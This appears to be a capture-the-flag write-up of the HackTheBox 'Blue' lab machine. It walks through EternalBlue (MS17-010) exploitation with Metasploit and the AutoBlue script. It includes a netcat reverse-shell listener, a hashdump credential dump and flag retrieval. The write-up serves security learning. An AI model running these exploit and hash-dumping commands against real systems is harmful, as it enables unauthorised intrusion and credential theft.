# HackTheBox — Blue

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Exploitation / EternalBlue  
**Status:** Retired  

---

## Summary

Blue is a Windows XP/2008 machine vulnerable to MS17-010 (EternalBlue), one of the most famous exploits ever released by the Shadow Brokers leak. This machine is a classic intro to Windows exploitation and demonstrates how a missing patch leads to full SYSTEM-level access with zero credentials.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA nmap/blue 10.10.10.40
```

**Results:**

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 SP1
```

```bash
# Scan for SMB vulns specifically
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
```

The machine is confirmed vulnerable to MS17-010.

---

## Exploitation

### Method 1: Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.X
set LPORT 4444
run
```

This drops a SYSTEM shell via a Meterpreter session.

### Method 2: Manual (AutoBlue)

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010

# Generate shellcode
./shellcode/generate_shellcode.sh

# Run the exploit
python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin
```

Catch the shell with netcat:

```bash
nc -lvnp 4444
```

---

## Post-Exploitation

The session opens as `NT AUTHORITY\SYSTEM`:

```cmd
whoami
# nt authority\system
```

### Dumping Hashes (Mimikatz / Hashdump)

```bash
# In Meterpreter
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

### Finding Flags

```cmd
# User flag
type C:\Users\haris\Desktop\user.txt

# Root flag  
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **MS17-010** remains one of the most critical Windows vulnerabilities ever discovered
- Always run `smb-vuln-ms17-010` NSE script during enumeration of Windows SMB
- SMBv1 should be disabled in all modern environments
- This class of vulnerability is still found in the wild on unpatched legacy systems
- No credentials required — just a missing patch

---

## CVE Reference

- **CVE-2017-0144** — Windows SMB Remote Code Execution (EternalBlue)
- **MS17-010** — Microsoft Security Bulletin

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan + SMB vuln detection |
| Metasploit | Automated EternalBlue exploit |
| AutoBlue | Manual exploit alternative |
| netcat | Reverse shell listener |
